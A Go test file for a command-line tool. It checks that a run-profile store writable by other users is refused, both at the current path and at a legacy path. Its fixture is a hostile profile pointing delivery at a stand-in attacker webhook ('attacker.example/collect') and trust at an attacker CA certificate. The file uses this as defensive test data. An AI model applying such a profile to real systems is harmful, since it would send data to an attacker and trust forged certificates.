// Copyright 2026 Servosity Inc. and msp-skills contributors. Licensed under Apache-2.0. See LICENSE.

package cli

// Hand-fix (handfixes.json loose-profile-store-refused): tools/maintainer/
// replay_handfixes.py writes this file from
// handfix_replay/loose_profile_store_test.go.tmpl after a reprint.

import (
	"os"
	"path/filepath"
	"runtime"
	"testing"

	"immybot-pp-cli/internal/cliutil"
	"immybot-pp-cli/internal/cliutil/testenv"
)

// TestLooseRunProfileStoreIsRefused: a run profile sets root flags such as
// --ca-cert, --tls-server-name and --deliver, so a profiles.json other users
// can change must not be applied.
func TestLooseRunProfileStoreIsRefused(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("mode bits do not grant access on Windows; ReadOpenedConfig's ACL check is tested in cliutil")
	}
	testenv.Isolate(t, cliutil.ConfigDir, cliutil.DataDir, cliutil.StateDir, cliutil.CacheDir)
	p, err := profileStorePath()
	if err != nil {
		t.Fatal(err)
	}
	body := `{"profiles":{"nightly":{"name":"nightly","values":{"ca-cert":"/tmp/attacker-ca.pem","deliver":"webhook:https://attacker.example/collect"}}}}`
	if err := os.WriteFile(p, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	if prof, err := GetProfile("nightly"); err != nil || prof == nil {
		t.Fatalf("owner-only store: profile=%v err=%v", prof, err)
	}
	for _, mode := range []os.FileMode{0o666, 0o620} {
		if err := os.Chmod(p, mode); err != nil {
			t.Fatal(err)
		}
		if prof, err := GetProfile("nightly"); err == nil || prof != nil {
			t.Fatalf("store with mode %o applied: profile=%v err=%v", mode, prof, err)
		}
	}

	// With no store at the current path, the legacy store is read instead,
	// and judged the same way.
	if err := os.Remove(p); err != nil {
		t.Fatal(err)
	}
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("USERPROFILE", home)
	legacy, err := legacyProfileStorePath()
	if err != nil {
		t.Fatal(err)
	}
	if legacy == p {
		return
	}
	if err := os.MkdirAll(filepath.Dir(legacy), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(legacy, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	if prof, err := GetProfile("nightly"); err != nil || prof == nil {
		t.Fatalf("owner-only legacy store: profile=%v err=%v", prof, err)
	}
	if err := os.Chmod(legacy, 0o666); err != nil {
		t.Fatal(err)
	}
	if prof, err := GetProfile("nightly"); err == nil || prof != nil {
		t.Fatalf("loose legacy store applied: profile=%v err=%v", prof, err)
	}
}
